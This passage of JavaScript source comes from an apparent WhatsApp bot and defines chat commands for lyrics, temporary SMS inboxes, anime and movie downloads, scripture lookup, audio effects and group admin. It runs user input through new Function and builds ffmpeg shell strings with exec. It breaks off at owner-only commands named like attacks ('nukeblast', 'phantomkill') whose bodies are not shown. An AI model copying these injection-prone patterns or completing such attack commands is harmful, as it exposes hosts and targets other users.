            const lyricsMessage = `🎵 *Big Daddy LYRICS*\n\n` +
                                  `*🎶 Title:* ${title}\n` +
                                  `*🎤 Artist:* ${artist}\n\n` +
                                  `${lyrics}\n\n` +
                                  `> Generated`;

            replyphistar(lyricsMessage);
        } else {
            replyphistar(`*No lyrics found for:* ${title} by ${artist}`);
        }
    } catch (error) {
        console.error('Error fetching lyrics:', error);
        replyphistar(`*Failed to fetch lyrics. Possible reasons:*\n1. Invalid title or artist.\n2. API issues.\n\n*Error Details:* ${error.message}`);
    }
    break;
}

case 'tempnumber': {
    await PhistarBotInc.sendMessage(m?.chat, { react: { text: `📞`, key: m?.key } });

    try {
        let { data } = await axios.get('https://reaperxxxx-dhdhd.hf.space/');
        if (!data.numbers || data.numbers.length === 0) return replyphistar("❌ No temporary numbers available.");

        let randomNumber = data.numbers[Math.floor(Math.random() * data.numbers.length)];

        let caption = `📞 *Temporary Number Found!*\n\n📱 *Number:* ${randomNumber}\n\n*To check the inbox, use:*
_${prefix}numberinbox ${randomNumber}_`;

        let imageOptions = {
            image: { url: 'https://files.catbox.moe/kuvjof.jpg' },
            caption: caption
        };

        await PhistarBotInc.sendMessage(m.chat, imageOptions, { quoted: m });

    } catch (error) {
        console.error(error);
        replyphistar("❌ Failed to fetch a temporary number. Try again later.");
    }
    break;
}

case 'numberinbox': {
    await PhistarBotInc.sendMessage(m?.chat, { react: { text: `🔍`, key: m?.key } });

    if (!text) return replyphistar("❓ Usage: .numberinbox <number>\nExample: .numberinbox 18044136719");

    let number = text.trim();
    replyphistar(`📬 Checking inbox for ${number}...`);

    try {
        let { data } = await axios.get(`https://reaperxxxx-dhdhd.hf.space/sms?no=${number}`);
        if (!data.messages || data.messages.length === 0) return replyphistar(`📭 Inbox for ${number} is empty or unavailable.`);

        let messages = data.messages.map((msg, index) =>
            `📩 *${index + 1}*\n📨 *From:* ${msg.sender}\n🕒 *Time:* ${msg.timestamp}\n📜 *Message:* ${msg.message}`
        ).join("\n\n");

        let caption = `📬 *Inbox for ${number}:*\n\n${messages}`;

        let videoOptions = {
            video: { url: 'https://files.catbox.moe/c5lo6d.mp4' },
            caption: caption,
            mimetype: 'video/mp4'
        };

        await PhistarBotInc.sendMessage(m.chat, videoOptions, { quoted: m });

    } catch (error) {
        console.error(error);
        replyphistar("❌ Failed to fetch inbox. Check the number and try again.");
    }
    break;
}

case 'animedl': {
    if (!text) return replyphistar("❓ Usage: .anime <name> <episode>\nExample: .anime one piece 16");

    let [name, episode] = text.split(' ');
    if (!name || !episode) return replyphistar("❓ Usage: .anime <name> <episode>\nExample: .anime one piece 16");

    replyphistar("🔍 Searching for the episode...");

    try {
        let apiUrl = `https://api-x-demon-dev.hf.space/api/animedl?name=${encodeURIComponent(name)}&episode=${encodeURIComponent(episode)}`;
        let { data } = await axios.get(apiUrl);

        if (!data.success || !data.downloadLinks || data.downloadLinks.length === 0) {
            return replyphistar("❌ No download links found for this anime episode.");
        }

        let mp4Link = data.downloadLinks.find(url => url.endsWith('.mp4'));
        if (!mp4Link) {
            return replyphistar("❌ No MP4 format found. Try another episode.");
        }

        let filename = `${name.replace(/\s+/g, '_')}_Episode_${episode}.mp4`;
        let filePath = `./temp/${filename}`;

        replyphistar("📥 Downloading the episode, please wait...");
        let response = await axios({ url: mp4Link, responseType: 'stream' });
        let writer = fs.createWriteStream(filePath);
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        await PhistarBotInc.sendMessage(m.chat, { document: fs.readFileSync(filePath), mimetype: 'video/mp4', fileName: filename }, { quoted: m });

        fs.unlinkSync(filePath);
    } catch (error) {
        console.error(error);
        replyphistar("❌ Failed to fetch or download the episode. Try again later.");
    }
    break;
}

case 'periodic-table': {
    if (!args[0]) return replyphistar("Give me a chemical element!");
    await PhistarBotInc.sendMessage(m?.chat, { react: { text: `⏳`, key: m?.key } });
    replyphistar('`Searching...`');
    let e = await fetchJson(`https://api.popcat.xyz/periodic-table?element=${args[0]}`);
    let david = `${e.name}`;
    let anita = `${e.phase}`;
    let ass = `${e.symbol}`;
    let Jenifer = `${e.atomic_number}`;
    let babe = `${e.summary}`;

    const pts = `*Name:* ${david}\n *Symbol:* ${ass}\n *Phase:* ${anita}\n *Atomic_Number:* ${Jenifer}\n *Summary:* ${babe}`;

    await PhistarBotInc.sendMessage(m.chat, {
        image: { url: e.image },
        caption: pts
    }, { quoted: m });
}
break;

case 'bible': {
    const BASE_URL = 'https://bible-api.com';
    try {
        let chapterInput = m.text.split(' ').slice(1).join('').trim();
        if (!chapterInput) {
            throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`);
        }
        chapterInput = encodeURIComponent(chapterInput);
        let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`);
        if (!chapterRes.ok) {
            throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`);
        }
        let chapterData = await chapterRes.json();
        let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true });
        let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true });
        let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`;

        let msgs = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: bibleChapter
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: 'Big Daddy'
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            ...await prepareWAMessageMedia({ image: fs.readFileSync('./thumb.png') }, { upload: PhistarBotInc.waUploadToServer })
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "quick_reply",
                                "buttonParamsJson": `{\"display_text\":\"AMEN🙏\",\"id\":\""}`
                            }],
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender],
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '',
                                newsletterName: 'Phistar',
                                serverMessageId: 143
                            }
                        }
                    })
                }
            }
        }, { quoted: m });
        return await PhistarBotInc.relayMessage(m.chat, msgs.message, {});
    } catch (error) {
        replyphistar(`Error: ${error.message}`);
    }
}
break;

case 'quran': {
    try {
        let surahInput = m.text.split(' ')[1];
        if (!surahInput) {
            throw new Error(`Please specify the surah number or name`);
        }
        let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran');
        let surahList = await surahListRes.json();
        let surahData = surahList.data.find(surah =>
            surah.number === Number(surahInput) ||
            surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() ||
            surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
        );
        if (!surahData) {
            return replyphistar(`Couldn't find surah with number or name "${surahInput}"`);
        }
        let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`);
        if (!res.ok) {
            let error = await res.json();
            return replyphistar(`API request failed with status ${res.status} and message ${error.message}`);
        }

        let json = await res.json();

        let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true });
        let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true });

        let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}\n\n> Generated`;

        replyphistar(quranSurah);

        if (json.data.recitation.full) {
            PhistarBotInc.sendMessage(m.chat, { audio: { url: json.data.recitation.full }, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3` }, { quoted: m });
        }
    } catch (error) {
        replyphistar(`Error: ${error.message}`);
    }
}
break;
case "ocr": {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    if (!mime) return replyphistar(`Convert image with .ocr command`);
    if (!/image\/(jpe?g|png)/.test(mime)) return replyphistar(`_*Type ${mime} not supported!*_`);
    const ocrapi = require("ocr-space-api-wrapper");
    let img = await PhistarBotInc.downloadAndSaveMediaMessage(q);
    let url = await TelegraPH(img);
    let hasil = await ocrapi.ocrSpace(url);
    await replyphistar(hasil.ParsedResults[0].ParsedText);
}
break;

case "stickers": {
    if (!text) return replyphistar(`Ex: ${prefix + command} cat`);
    const anu = await stickersearch(text);
    const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
    const randomStickers = shuffledStickers.slice(0, 10);

    if (randomStickers.length > 0) {
        for (let i = 0; i < randomStickers.length; i++) {
            try {
                await new Promise(resolve => setTimeout(resolve, i * 6000));
                await PhistarBotInc.sendImageAsSticker(m?.chat, randomStickers[i], m, {
                    packname: global.packname,
                    author: global.author
                });
            } catch (error) {
                console.error(`Error sending file: ${error.message}`);
                await replyphistar(`Failed to send sticker *(${i + 1}/${randomStickers.length})*`);
            }
        }
    }
}
break;

case "translate": {
    let lang, text;
    if (args.length >= 2) {
        lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ');
    } else if (m?.quoted && m?.quoted.text) {
        lang = args[0] ? args[0] : 'id', text = m?.quoted.text;
    } else return replyphistar(`Example: Translate id Hello I am robot`);

    let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null);
    if (!res) return replyphistar(`Error: This Language "${lang}" Not Supported\nType .languages`);
    replyphistar(`*Language Detected:* ${res.from?.language.iso}\n*To Language:* ${lang}\n\n*Translation:* ${res.text}`.trim());
}
break;

case "calculator": {
    let val = text
        .replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
        .replace(/×/g, '*')
        .replace(/÷/g, '/')
        .replace(/π|pi/gi, 'Math.PI')
        .replace(/e/gi, 'Math.E')
        .replace(/\/+/g, '/')
        .replace(/\++/g, '+')
        .replace(/-+/g, '-');
    let format = val
        .replace(/Math\.PI/g, 'π')
        .replace(/Math\.E/g, 'e')
        .replace(/\//g, '÷')
        .replace(/\*×/g, '×');
    try {
        console.log(val);
        let result = (new Function('return ' + val))();
        if (!result) throw result;
        replyphistar(`*${format}* = _${result}_`);
    } catch (e) {
        if (e == undefined) return replyphistar('The contents?');
        replyphistar('Wrong format, only 0-9 and Symbols -, +, *, /, ×, ÷, π, e, (, ) supported');
    }
}
break;

case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai': {
    try {
        let set;
        if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
        if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
        if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
        if (/earrape/.test(command)) set = '-af volume=12';
        if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
        if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
        if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
        if (/reverse/.test(command)) set = '-filter_complex "areverse"';
        if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
        if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
        if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
        if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
        if (/audio/.test(mime)) {
            let media = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);
            let ran = getRandom('.mp3');
            exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media);
                if (err) return replyphistar(err);
                let buff = fs.readFileSync(ran);
                PhistarBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m });
                fs.unlinkSync(ran);
            });
        } else replyphistar(`Reply to the audio you want to change with a caption *${prefix + command}*`);
    } catch (e) {
        console.log(e);
        replyphistar('Error');
    }
}
break;

case 'boostbass':
case 'bitcrush':
case 'deepvoice':
case 'loudmax':
case 'speedup':
case 'thicken':
case 'nightmode':
case 'rewind':
case 'cyborg':
case 'slowmo':
case 'smoothfps':
case 'chipmunk': {
    try {
        let set;
        if (command === 'boostbass') set = 'equalizer=f=54:width_type=o:width=2:g=20';
        if (command === 'bitcrush') set = 'acrusher=.1:1:64:0:log';
        if (command === 'deepvoice') set = 'atempo=1,asetrate=44500*2/3';
        if (command === 'loudmax') set = 'volume=12';
        if (command === 'speedup') set = 'atempo=1.63,asetrate=44100';
        if (command === 'thicken') set = 'atempo=1.6,asetrate=22100';
        if (command === 'nightmode') set = 'atempo=1.06,asetrate=44100*1.25';
        if (command === 'rewind') set = 'areverse';
        if (command === 'cyborg') set = "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75";
        if (command === 'slowmo') set = 'atempo=0.7,asetrate=44100';
        if (command === 'chipmunk') set = 'atempo=0.5,asetrate=65100';

        let media = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);
        let out = getRandom(/video/.test(mime) ? '.mp4' : '.mp3');

        // Video case
        if (/video/.test(mime)) {
            exec(`ffmpeg -i ${media} -filter:a "${set}" -map 0:v -map 0:a -c:v copy -shortest ${out}`, async (err) => {
                fs.unlinkSync(media);
                if (err) return replyphistar(`❌ FFmpeg Error:\n${err}`);
                let vid = fs.readFileSync(out);
                await PhistarBotInc.sendMessage(m.chat, { video: vid, mimetype: 'video/mp4' }, { quoted: m });
                fs.unlinkSync(out);
            });
        }

        // Audio case
        else if (/audio/.test(mime)) {
            exec(`ffmpeg -i ${media} -filter:a "${set}" ${out}`, async (err) => {
                fs.unlinkSync(media);
                if (err) return replyphistar(`❌ FFmpeg Error:\n${err}`);
                let aud = fs.readFileSync(out);
                await PhistarBotInc.sendMessage(m.chat, { audio: aud, mimetype: 'audio/mpeg' }, { quoted: m });
                fs.unlinkSync(out);
            });
        } else {
            replyphistar(`Reply to an *audio or video* message with *${prefix + command}*`);
        }
    } catch (e) {
        console.error(e);
        replyphistar('❌ An error occurred while processing the media.');
    }
}
break;

case "youtubsearch": case "yts": {
    try {
        let res = await yts(text);
        let url = res.all;
        let result = url[Math.floor(Math.random() * url.length)];

        async function image(url) {
            const { imageMessage } = await generateWAMessageContent({
                image: { url }
            }, {
                upload: PhistarBotInc.waUploadToServer
            });
            return imageMessage;
        }

        const url1 = result.thumbnail;
        const url2 = res.all[1].thumbnail;
        const url3 = res.all[2].thumbnail;

        const auth2 = res.all[1].author.name;
        const auth3 = res.all[2].author.name;

        const urlvid2 = res.all[1].url;
        const urlvid3 = res.all[2].url;

        let msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: { text: `*( 3 BEST SEARCHES )*\n\n*[ 1 ]* \n-- ${result.title}\n\n*[ 2 ]* \n-- ${res.all[1].title}\n\n*[ 3 ]* \n-- ${res.all[2].title}` },
                            carouselMessage: {
                                cards: [
                                    {
                                        header: {
                                            imageMessage: await image(url1),
                                            hasMediaAttachment: true,
                                        },
                                        body: { text: `*R E S U L T - V I D *\n\n*Upload By:* ${result.author.name}\nUrl: ${result.url}` },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{"display_text":"Play Song ✦","id": ".gcgcplaycuy ${result.url}"}`
                                                },
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{"display_text":"Download Video -","id": ".ytmp4 ${result.url}"}`
                                                },
                                                {
                                                    name: "cta_url",
                                                    buttonParamsJson: `{"display_text":"View <⊚>","url":"${url1}","webview_presentation":null}`,
                                                },
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await image(url2),
                                            hasMediaAttachment: true,
                                        },
                                        body: { text: `*R E S U L T - V I D *\n\n*Upload By:* ${auth2}\nUrl: ${urlvid2}` },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{"display_text":"Play Song ✦","id": ".gcgcplaycuy ${urlvid2}"}`
                                                },
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{"display_text":"Download Video -","id": ".ytmp4 ${urlvid2}"}`
                                                },
                                                {
                                                    name: "cta_url",
                                                    buttonParamsJson: `{"display_text":"View <⊚>","url":"${url1}","webview_presentation":null}`,
                                                },
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await image(url3),
                                            hasMediaAttachment: true,
                                        },
                                        body: { text: `*R E S U L T - V I D *\n\n*Upload By:* ${auth3}\nUrl: ${urlvid3}` },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{"display_text":"Play Song ✦","id": ".gcgcplaycuy ${urlvid3}"}`
                                                },
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{"display_text":"Download Video -","id": ".ytmp4 ${urlvid3}"}`
                                                },
                                                {
                                                    name: "cta_url",
                                                    buttonParamsJson: `{"display_text":"View <⊚>","url":"${url1}","webview_presentation":null}`,
                                                },
                                            ],
                                        },
                                    },
                                ],
                                messageVersion: 1,
                            },
                        },
                    },
                },
            },
            {}
        );

        await PhistarBotInc.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
        });

    } catch (error) {
        console.error(error);
    }
}
break;
case 'thai': {
    var notnot = JSON.parse(fs.readFileSync('./david-media/tiktokpics/thailand.json'));
    var hasil = pickRandom(notnot);
    let msgs = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `Hi ${pushname}\n_*Here is the result of: ${command}*_`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: 'Big Daddy'
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false,
                        ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: PhistarBotInc.waUploadToServer })
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            "name": "quick_reply",
                            "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
                        }],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '',
                            newsletterName: 'Phistar',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: m });
    return await PhistarBotInc.relayMessage(m.chat, msgs.message, {});
}
break;

case 'setbio': {
    if (!isCreator) return replyphistar('For My Owner Only');
    if (!text) return replyphistar(`Where is the text?\nExample: ${prefix + command} Phistar`);
    await PhistarBotInc.sendMessage(m?.chat, { react: { text: `✍🏼`, key: m?.key } });
    await PhistarBotInc.updateProfileStatus(text);
    replyphistar('`Success in changing bio, Boss!!🫡`');
    await PhistarBotInc.sendMessage(m?.chat, { react: { text: `✅`, key: m?.key } });
}
break;

case 'savevideo': {
    if (!m.quoted || !m.quoted.mimetype || !m.quoted.mimetype.includes('video')) {
        return replyphistar('❌ Reply to a *video file* with this command to save it.');
    }

    let videoPath = `${tempFolder}/video_${m.sender}.mp4`;

    try {
        let videoBuffer = await m.quoted.download();
        fs.writeFileSync(videoPath, videoBuffer);

        savedVideos[m.sender] = videoPath;
        saveVideoData(savedVideos);

        console.log(`✅ Video saved at: ${videoPath}`);
        replyphistar('✅ Video saved! Now reply to an audio file with `.addmusic` to merge.');
    } catch (err) {
        console.log('❌ Video Save Error:', err);
        replyphistar('❌ Failed to save the video.');
    }
}
break;

case 'addmusic': {
    if (!m.quoted || !m.quoted.mimetype || !m.quoted.mimetype.includes('audio')) {
        return replyphistar('❌ Reply to an *audio file* to add as background music.');
    }

    let audioPath = `${tempFolder}/audio_${m.sender}.mp3`;
    let outputPath = `${tempFolder}/output_${m.sender}.mp4`;

    try {
        let audioBuffer = await m.quoted.download();
        fs.writeFileSync(audioPath, audioBuffer);

        console.log(`🎬 Merging ${savedVideoPath} with ${audioPath}`);

        ffmpeg()
            .input(savedVideoPath)
            .input(audioPath)
            .outputOptions([
                '-map 0:v:0',  // Use video from first input
                '-map 1:a:0',  // Use audio from second input
                '-c:v copy',   // Keep original video quality
                '-shortest'    // Trim to shortest length
            ])
            .save(outputPath)
            .on('end', async () => {
                console.log('✅ Merge completed:', outputPath);

                await PhistarBotInc.sendMessage(m.chat, {
                    video: { url: outputPath },
                    mimetype: 'video/mp4',
                    caption: '\n> Generated'
                }, { quoted: m });

                // Cleanup
                fs.unlinkSync(savedVideoPath);
                fs.unlinkSync(audioPath);
                fs.unlinkSync(outputPath);

                delete savedVideos[m.sender];
                saveVideoData(savedVideos);

                console.log('🗑️ Temporary files deleted.');
            })
            .on('error', (err) => {
                console.log('❌ FFmpeg Error:', err);
                replyphistar('❌ Error processing video: ' + err.message);
            });

    } catch (err) {
        console.log('❌ Audio Save Error:', err);
        replyphistar('❌ Failed to save the audio.');
    }
}
break;

case 'setpp1':
case 'setpp':
case 'setppbot': {
    if (!isCreator) return replyphistar(`For My Owner Only`);
    if (!quoted)
        return replyphistar(`Send/Reply Image With Caption ${prefix + command}`);
    if (!/image/.test(mime))
        return replyphistar(`Send/Reply Image With Caption ${prefix + command}`);
    if (/webp/.test(mime))
        return replyphistar(`Send/Reply Image With Caption ${prefix + command}`);

    // Download and save the image
    var media = await PhistarBotInc.downloadMediaMessage(quoted);
    const sharp = require("sharp");
    const tempFile = `ppbot_${Date.now()}.jpeg`;

    try {
        // Resize the image to a square dimension (e.g., 640x640)
        await sharp(media)
            .resize(640, 640, {
                fit: "cover",
            })
            .jpeg()
            .toFile(tempFile);

        // Set the profile picture
        if (args[0] === "full") {
            var { img } = await generateProfilePicture(tempFile);
            await PhistarBotInc.query({
                tag: "iq",
                attrs: {
                    to: botNumber,
                    type: "set",
                    xmlns: "w:profile:picture",
                },
                content: [
                    {
                        tag: "picture",
                        attrs: { type: "image" },
                        content: img,
                    },
                ],
            });
        } else {
            await PhistarBotInc.updateProfilePicture(botNumber, { url: tempFile });
        }

        // Cleanup
        fs.unlinkSync(tempFile);
        replyphistar(`Profile picture updated successfully!`);
    } catch (error) {
        console.error("Error setting profile picture:", error);
        replyphistar(`Failed to set profile picture. Try again.`);
    }
}
break;

case 'revoke':
case 'resetlink': {
    if (!m.isGroup) return replyphistar(`For Group Only`);
    if (!isAdmins) return replyphistar(`For Admins Only`);
    await PhistarBotInc.groupRevokeInvite(m.chat)
        .then(res => {
            replyphistar(`Successful Reset, Group Invite Link ${groupMetadata.subject}`);
        })
        .catch(err => replyphistar(json(err)));
}
break;

case 'getpp': {
    if (!m.quoted && (!m.mentionedJid || m.mentionedJid.length === 0)) {
        return replyphistar(`Reply to someone's message or tag a user with ${prefix + command}`);
    }

    try {
        let targetUser = m.quoted ? m.quoted.sender : m.mentionedJid[0];
        let profilePicUrl = await PhistarBotInc.profilePictureUrl(targetUser, 'image');
        let responseMessage = `Profile picture of @${targetUser.split('@')[0]}`;
        await PhistarBotInc.sendMessage(m.chat, { image: { url: profilePicUrl }, caption: responseMessage, mentions: [targetUser] });
    } catch (error) {
        replyphistar("Couldn't fetch profile picture. The user might not have a profile picture or an error occurred.");
    }
}
break;

case 'tinyurl': {
    if (!q) return replyphistar('`link?`');
    const request = require('request');
    request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
        try {
            replyphistar(body);
        } catch (e) {
            replyphistar(e);
        }
    });
}
break;

case 'movie': {
    if (!text) return replyphistar(`❗ Example: ${prefix + command} <movie-name>`);

    try {
        await replyphistar(`🔍 *Searching for movies...*\nPlease wait.`);
        const apiUrl = `https://www.dark-yasiya-api.site/movie/sinhalasub/search?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        const { status, result } = response.data;
        if (!status || !result || result.movies.length === 0) {
            return replyphistar(`❌ No movies found for "${text}". Please try again.`);
        }

        global.movieSearchResults = result.movies;

        let movieList = `🎥 *Search Results for "${text}":*\n\n`;
        result.movies.forEach((movie, index) => {
            movieList += `${index + 1}. *${movie.title}*\n   🌟 ${movie.imdb} | 📅 ${movie.year}\n   🔗 [Details](${movie.link})\n\n`;
        });
        movieList += `\nTo select a movie, use the command:\n*.selectmovie <number>* (e.g., *.selectmovie 1*).`;

        await replyphistar(movieList);
    } catch (error) {
        console.error('Error searching for movies:', error.message);
        replyphistar(`❌ An error occurred while searching for movies. Please try again.`);
    }
}
break;

case 'selectmovie': {
    if (!text) return replyphistar(`❗ Example: ${prefix + command} <number>\nSelect a movie from the list.`);
    if (!global.movieSearchResults || global.movieSearchResults.length === 0) {
        return replyphistar(`❌ No movies found. Please use the *movie* command first.`);
    }

    const selectedIndex = parseInt(text.trim()) - 1;
    if (isNaN(selectedIndex) || selectedIndex < 0 || selectedIndex >= global.movieSearchResults.length) {
        return replyphistar(`❌ Invalid number. Please choose a valid movie number from the list.`);
    }

    const selectedMovie = global.movieSearchResults[selectedIndex];
    const movieDetailsUrl = `https://www.dark-yasiya-api.site/movie/sinhalasub/movie?url=${encodeURIComponent(selectedMovie.link)}`;

    try {
        await replyphistar(`🔍 *Fetching movie details...*\nPlease wait.`);
        const response = await axios.get(movieDetailsUrl);

        const { status, result } = response.data;
        if (!status || !result) {
            return replyphistar(`❌ Failed to fetch movie details. Please try again.`);
        }

        const movie = result.data;
        global.movieLinks = movie.dl_links;
        global.selectedMovieTitle = movie.title;

        let movieInfo = `🎬 *${movie.title}*\n\n`;
        movieInfo += `📅 *Release Date:* ${movie.date}\n`;
        movieInfo += `🌍 *Country:* ${movie.country}\n`;
        movieInfo += `⏳ *Runtime:* ${movie.runtime}\n`;
        movieInfo += `⭐ *IMDb Rating:* ${movie.imdbRate}/10 (${movie.imdbVoteCount} votes)\n`;
        movieInfo += `🎥 *TMDb Rating:* ${movie.tmdbRate}/10\n\n`;
        movieInfo += `💾 *Available Qualities:*\n`;
        movie.dl_links.forEach((link, index) => {
            movieInfo += `${index + 1}. *${link.quality}* - ${link.size}\n`;
        });
        movieInfo += `\nTo download, use the command:\n*.dlmovie <number>* (e.g., *.dlmovie 2*).`;

        await PhistarBotInc.sendMessage(m.chat, { image: { url: movie.image }, caption: movieInfo }, { quoted: m });
    } catch (error) {
        console.error('Error fetching movie details:', error.message);
        replyphistar(`❌ An error occurred while fetching movie details. Please try again.`);
    }
}
break;

case 'dlmovie': {
    if (!text) return replyphistar(`❗ Example: ${prefix + command} <number>\nChoose a quality number from the list provided earlier.`);
    if (!global.movieLinks || global.movieLinks.length === 0) {
        return replyphistar(`❌ No movie details found. Please use the *selectmovie* command first.`);
    }

    const selectedIndex = parseInt(text.trim()) - 1;
    if (isNaN(selectedIndex) || selectedIndex < 0 || selectedIndex >= global.movieLinks.length) {
        return replyphistar(`❌ Invalid number. Please choose a valid quality number from the list.`);
    }

    const selectedLink = global.movieLinks[selectedIndex]?.link;
    if (!selectedLink) {
        return replyphistar(`❌ Could not find the selected quality. Please try again.`);
    }

    try {
        await replyphistar(`⏳ *Downloading the movie...*\nThis might take a while, please be patient.`);

        const movieFile = await axios({
            url: selectedLink,
            method: 'GET',
            responseType: 'stream'
        });

        const filePath = `./movie_${Date.now()}.mp4`;
        const writer = fs.createWriteStream(filePath);
        movieFile.data.pipe(writer);

        writer.on('finish', async () => {
            const movieTitle = global.selectedMovieTitle || 'Movie';
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: filePath },
                mimetype: 'video/mp4',
                fileName: `${movieTitle}.mp4`,
                caption: `🎥\n*Title:* ${movieTitle}\n\n> Generated`
            });

            fs.unlinkSync(filePath);
        });

        writer.on('error', (err) => {
            console.error('Error saving the movie file:', err);
            replyphistar(`❌ Failed to download the movie. Please try again.`);
        });
    } catch (error) {
        console.error('Error downloading the movie:', error.message);
        replyphistar(`❌ An error occurred while downloading the movie. Please try again.`);
    }
}
break;

case 'invite': {
    if (!m.isGroup) return replyphistar(`For Group Only`);
    if (!text) return replyphistar(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 2347043759577`);
    if (text.includes('+')) return replyphistar(`Enter the number together without *+*`);
    if (isNaN(text)) return replyphistar(`Enter only the numbers plus your country code without spaces`);
    let group = m.chat;
    let link = 'https://chat.whatsapp.com/' + await PhistarBotInc.groupInviteCode(group);
    await PhistarBotInc.sendMessage(text + '@s.whatsapp.net', {
        text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`,
        mentions: [m.sender]
    });
    replyphistar('`An invite link is sent to the user`');
}
break;

case 'nukeblast': 
case 'darkvoid': 
case 'venomstrike': 
case 'phantomkill': 
case 'deathpulse': 
case 'toxicstorm': 
case 'shadowforce': 
case 'inferno': 
case 'blackout': {
  if (!isCreator) return replyphistar(`For My Owner Only`);
